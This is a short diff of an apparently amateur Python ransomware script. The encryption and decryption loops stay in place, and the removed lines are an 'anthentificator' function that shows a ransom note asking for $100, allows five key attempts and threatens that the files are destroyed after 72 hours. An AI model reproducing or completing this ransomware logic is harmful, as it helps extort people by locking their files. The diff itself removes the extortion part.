@@ -39,7 +39,6 @@ def encrypt(key,list_of_files):
                         key_index+=1
             except:
                 print("encryption failed for file:"+str(file))
-    anthentificator(key,list_of_files)
 
 def decrypt(key,list_of_files):
     for file in list_of_files:
@@ -61,22 +60,5 @@ def decrypt(key,list_of_files):
                         key_index+=1
             except:
                 print("Decryption failed for file: "+str(file))
-
-def anthentificator(key,list_of_files):
-    number_of_try=5
-    print("Your file are now encrypted.")
-    print("Please pay 100$ at https://www.paypal.com/ca/home to get the key to unlock your files.")
-    print("Note that you have only 5 try to reedem the key and 72h to recover your files before they get delete forever.")
-    while number_of_try != 0:
-        userkey = str(input("Please enter your provided key here: "))
-        if userkey == key:   
-            decrypt(key,list_of_files)
-            print("Your files are now decrypted")
-            break
-        else:
-            number_of_try=number_of_try-1
-            print(str(number_of_try) +" try left")
-    else:
-        print("Sorry.Your files has been destroy")    
               
-generatekey()     
+generatekey()
